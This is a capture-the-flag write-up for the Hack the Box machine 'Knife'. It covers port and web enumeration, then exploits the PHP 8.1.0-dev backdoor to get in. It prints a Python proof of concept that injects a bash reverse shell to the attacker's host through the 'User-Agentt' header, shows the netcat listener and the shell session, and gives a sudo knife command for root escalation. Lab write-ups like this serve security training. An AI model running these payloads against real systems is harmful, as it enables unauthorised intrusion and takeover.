@@ -1,0 +1,187 @@
+#+setupfile: ../templates/level-0.org
+#+title: HTB | knife
+#+date: <2021-08-29 Sun> 
+#+summary: Write-up for knife! The easy linux box from Hack the Box. It has a webserver running a php version containing a backdoor.
+#+filetags: :HTB:write-up:hacking:
+* DONE Introduction
+Welcome back to another write-up for another Hack the Box machine.
+This time we'll look at the easy linux box Knife.
+This machine was running a webserver with an old PHP version on it, but we'll dive deeper into that later.
+
+* DONE Recon
+First things first, let's get to know this machine a little better shall we?
+We'll start by examining what services the machine has running.
+** DONE Nmap all ports
+Below we see the output from the ~nmap~ scan.
+#+caption: Nmap scan targeting all ports
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
+└─> $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
+Nmap scan report for 10.129.180.32
+Host is up (0.034s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.13 seconds
+#+end_example
+We see the webserver mentioned earlier running on port 80, which is ~Apache httpd 2.4.41~.
+There is also an open ~ssh~ daemon running on port 22.
+
+** DONE Web enumeration
+All right let us enumerate the webserver
+*** DONE Gobuster
+~gobuster~ didn't really give us anything of use other than ~/index.php~.
+#+caption: gobuster result
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
+└─> $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.180.32
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/c3lphie/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2021/07/26 19:23:57 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 5815]
+/.                    (Status: 200) [Size: 5815]
+
+===============================================================
+2021/07/26 19:56:17 Finished
+===============================================================
+#+end_example
+*** DONE ~/index.php~
+If we open up the site with a browser connected to a proxy like ~zap~ or ~burp~, and navigate to ~/index.php~.
+#+attr_org: :width 700
+#+caption: Rendered html of ~/index.php~
+[[file:assets/2021-07-26_19-51-07_screenshot.png]]
+
+The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.
+#+begin_example
+HTTP/1.1 200 OK
+Date: Mon, 26 Jul 2021 17:20:52 GMT
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/8.1.0-dev
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+#+end_example
+
+Here we again see the server version as ~Apache/2.4.41~, but more importantly the PHP version is leaked.
+If you look at the ~X-Powered-By:~ header, we see that it's is running ~PHP/8.1.0-dev~.
+
+* DONE Exploitation
+** Finding the vulnerability
+Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.
+
+Googling the PHP version, you'll quickly find that there is a backdoor in that version[fn:1].
+Which could be used to gain a shell.
+They even gave a script that gives a reverse shell on the target.
+[[https://github.com/flast101/php-8.1.0-dev-backdoor-rce][GitHub Repo]]
+
+We can take a closer look at the POC to getter a better understand the backdoor.
+The backdoor allowed for remote code execution in the custom header "User-Agentt", notice the extra "t".
+#+caption: reverse shell POC code
+#+begin_src python
+  def reverse_shell(args):
+      payload = (
+          'bash -c "bash -i >& /dev/tcp/'
+          + args.lhost
+          + "/"
+          + args.lport
+          + ' 0>&1"'
+      )
+      injection = request.get(
+          args.url,
+          headers={"User-Agentt": "zerodiumsystem('" + payload + "');"},
+          allow_redirects=False,
+      )
+#+end_src
+First the payload is crafted based on the given arguments.
+It essentially builds the command:
+: $ bash -c "bash -i >& /dev/tcp/<LOCAL-IP>/<LOCAL-PORT> 0>&1"
+
+Which is then injected into the special header "User-Agentt", inside the parentheses of ~"zerodiumsystem();"~.
+** Popping shell
+First we setup a ~netcat~ listener on our machine:
+: $ nc -nlvp 4444
+
+Then we execute the revshell POC script with the right arguments:
+#+begin_example
+┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
+└─> $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
+#+end_example
+
+And just like that we got a shell and user flag:
+#+begin_example
+┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
+└─> $ nc -nlvp 4444                                                    19:56
+james@knife:/$ whoami
+whoami
+james
+james@knife:/$ cd home
+cd home
+james@knife:/home$ ls
+ls
+james
+james@knife:/home$ cd james
+cd james
+james@knife:~$ ls
+ls
+user.txt
+james@knife:~$ cat user.txt
+cat user.txt
+1f92████████████████████████████
+james@knife:~$
+#+end_example
+
+* DONE Priv-esc
+Now that we got a shell, we must escalate our privileges to get ~root~.
+
+By using the linux enumeration tool ~linpeas~, we will find that ~james~, our user, has nopassword permissions for the binary ~/usr/bin/knife~.
+
+Which given the machines name, could be worth looking into.
+Let's open [[https://gtfobins.github.io/][GTFObins]], and search for knife.
+This shows the that following command can be used to escalate our privileges:
+: $ sudo knife exec -E 'exec "/bin/sh"'
+
+So let's run it and get our ~root~ flag:
+#+begin_example
+james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
+sudo knife exec -E 'exec "/bin/bash"'
+
+whoami
+root
+pwd
+/
+cd root
+ls
+delete.sh
+root.txt
+snap
+cat root.txt
+10a1████████████████████████████
+#+end_example
+
+* Footnotes
+
+[fn:1] Read more here: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/ 
